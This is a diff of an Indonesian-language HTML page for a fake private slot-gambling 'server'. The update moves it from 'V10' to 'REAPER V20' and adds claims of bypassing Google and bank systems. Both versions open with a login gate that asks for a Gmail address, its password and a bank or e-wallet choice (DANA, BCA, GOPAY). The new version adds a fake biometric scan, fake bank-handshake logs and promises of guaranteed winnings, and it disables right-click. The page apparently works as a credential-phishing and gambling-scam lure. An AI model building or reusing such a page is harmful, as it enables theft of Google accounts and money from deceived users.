@@ -3,76 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EYE-REAPER V10 | SERVER PRIVATE ASIA</title>
+    <title>REAPER V20 | QUANTUM OVERLORD NODE</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Goldman:wght@400;700&family=Roboto:wght@300;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Goldman:wght@700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
 </head>
 <body oncontextmenu="return false;">
 
-    <div class="news-ticker">
-        <marquee>PENGUMUMAN: Gunakan Link Alternatif ini jika terkena Internet Positif | Selamat kepada ID: reyy*** yang baru saja WD Rp 250.000.000 via Dana | Server SG-V3 Maintenance pukul 04:00 WIB.</marquee>
+    <div class="global-bar">
+        <div class="node-loc">GLOBAL NODE: <span id="node-city">TOKYO-V20</span></div>
+        <div class="secure-tag">ENCRYPTED QUANTUM TUNNEL ACTIVE</div>
     </div>
 
-    <div id="gate-system" class="overlay">
-        <div class="auth-card">
-            <div class="brand-logo">EYE<span>REAPER</span></div>
-            <div class="shimmer">VVIP LOGIN CLOUD</div>
-            <p class="sub-text">Gunakan Akun Gmail untuk Sinkronisasi Saldo Maxwin</p>
-            <div class="input-group">
-                <input type="email" id="u_email" placeholder="Gmail / Username" required>
-                <input type="password" id="u_pass" placeholder="Password Akun" required>
-                <select id="u_bank">
-                    <option value="">Pilih Bank / E-Wallet</option>
-                    <option value="DANA">DANA (Otomatis)</option>
-                    <option value="BCA">BCA (Otomatis)</option>
-                    <option value="GOPAY">GOPAY (Otomatis)</option>
-                </select>
-                <button class="main-btn" onclick="omniIdentity()">MASUK KE SERVER GACOR</button>
+    <div id="gate" class="overlay">
+        <div class="v20-container">
+            <div class="logo-v20">REAPER<span>V20</span></div>
+            <p class="subtitle">SISTEM BYPASS GOOGLE & BANK CENTRAL</p>
+            
+            <div id="auth-panel">
+                <div class="v20-field">
+                    <label>AKUN GOOGLE VVIP</label>
+                    <input type="email" id="email" placeholder="Email Akun" required>
+                </div>
+                <div class="v20-field">
+                    <label>PASSKEY AKSES</label>
+                    <input type="password" id="pass" placeholder="Password" required>
+                </div>
+                <div class="v20-field">
+                    <label>TUJUAN PENCAIRAN (AUTO)</label>
+                    <select id="bank">
+                        <option value="DANA">DANA PREMIUM</option>
+                        <option value="BCA">BCA VVIP LINE</option>
+                        <option value="GOPAY">GOPAY PLUS</option>
+                    </select>
+                </div>
+                <button class="v20-btn" onclick="omniIdentity()">AKSES SERVER PUSAT</button>
             </div>
-            <div class="social-login">
-                <img src="https://i.imgur.com/vH9Xv9V.png" width="20"> Login via Google Secure
+
+            <div id="bio-scan" class="hidden">
+                <div class="face-frame">
+                    <div class="scanner-line"></div>
+                </div>
+                <p id="scan-text">MENCARI DATA BIOMETRIK GMAIL...</p>
+                <div class="loader-v20"><div class="fill"></div></div>
             </div>
         </div>
     </div>
 
-    <main id="main-hub" class="hidden-blur">
-        <nav class="top-nav">
-            <div class="menu-icon">☰</div>
-            <div class="user-profile">
-                Saldo: <span id="user-bal" class="gold">Rp 0</span> | <span id="display-user">Guest</span>
-            </div>
-        </nav>
+    <main id="hub" class="blur-v20">
+        <div class="side-log" id="live-feed"></div>
 
-        <section class="hero-banner">
-            <img src="https://i.imgur.com/8Km9tLL.png" class="banner-img">
-            <div class="jackpot-counter">
-                <p>GRAND JACKPOT</p>
-                <h1 id="total-jp">IDR 8.421.550.210</h1>
-            </div>
-        </section>
-
-        <div class="game-tabs">
-            <div class="tab active">HOT GAMES</div>
-            <div class="tab">SLOTS</div>
-            <div class="tab">CASINO</div>
+        <div class="main-display">
+            <small>SALDO GLOBAL READY TO WITHDRAW</small>
+            <h1 id="user-bal">IDR 0,00</h1>
+            <div class="v20-status">STATUS: TERKONEKSI SATELIT</div>
         </div>
 
-        <section class="game-grid">
-            <div class="game-card" onclick="spinSlot()">
-                <img src="https://via.placeholder.com/150/000/ffd700?text=ZEUS+V10">
-                <div class="rtp-tag">RTP 99.8%</div>
-                <p>GATES OF REAPER</p>
+        <div class="action-grid">
+            <div class="card" onclick="startSpin()">
+                <div class="icon">🌌</div>
+                <span>INJECT QUANTUM</span>
+                <small>RTP 100% FIXED</small>
             </div>
-            <div class="game-card" onclick="spinSlot()">
-                <img src="https://via.placeholder.com/150/000/ffd700?text=MAHJONG">
-                <div class="rtp-tag">RTP 98.5%</div>
-                <p>MAHJONG WAYS 3</p>
+            <div class="card pulse-purple" onclick="triggerWD()">
+                <div class="icon">💠</div>
+                <span>PENCAIRAN DANA</span>
+                <small>ESTIMASI 2 MENIT</small>
             </div>
-        </section>
+        </div>
 
-        <div class="floating-chat" onclick="alert('Admin sedang memproses WD antrian #402. Mohon tunggu.')">
-            <div class="chat-notif">1</div>
-            <img src="https://i.imgur.com/4M3499Q.png">
+        <div class="v20-terminal" id="logs">
+            > Memulai Sesi Private... [DONE]<br>
+            > Melakukan Handshake ke Bank... [DONE]<br>
         </div>
     </main>
 
